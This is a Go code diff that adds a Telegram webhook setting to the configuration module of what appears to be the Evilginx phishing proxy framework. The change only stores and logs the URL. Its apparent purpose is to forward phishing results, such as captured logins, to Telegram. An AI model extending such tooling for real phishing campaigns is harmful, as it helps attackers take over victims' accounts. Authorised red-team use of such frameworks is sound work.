@@ -91,6 +91,7 @@ type Config struct {
 	lureIds         []string
 	subphishlets    []*SubPhishlet
 	cfg             *viper.Viper
+	webhook_telegram  string
 }
 
 const (
@@ -102,6 +103,7 @@ const (
 	CFG_BLACKLIST    = "blacklist"
 	CFG_SUBPHISHLETS = "subphishlets"
 	CFG_GOPHISH      = "gophish"
+	CFG_WEBHOOK_TELEGRAM   = "webhook_telegram"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -142,6 +144,8 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	if err != nil {
 		return nil, err
 	}
+
+	c.webhook_telegram = c.cfg.GetString(CFG_WEBHOOK_TELEGRAM)
 
 	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
 	if c.cfg.Get("general.autocert") == nil {
@@ -476,6 +480,16 @@ func (c *Config) SetBlacklistMode(mode string) {
 		c.cfg.WriteConfig()
 	}
 	log.Info("blacklist mode set to: %s", mode)
+}
+
+func (c *Config) SetWebhookTelegram(webhook string) {
+	c.webhook_telegram = webhook
+	c.cfg.Set(CFG_WEBHOOK_TELEGRAM, webhook)
+	log.Info("telegram webhook set to: %s", webhook)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetUnauthUrl(_url string) {
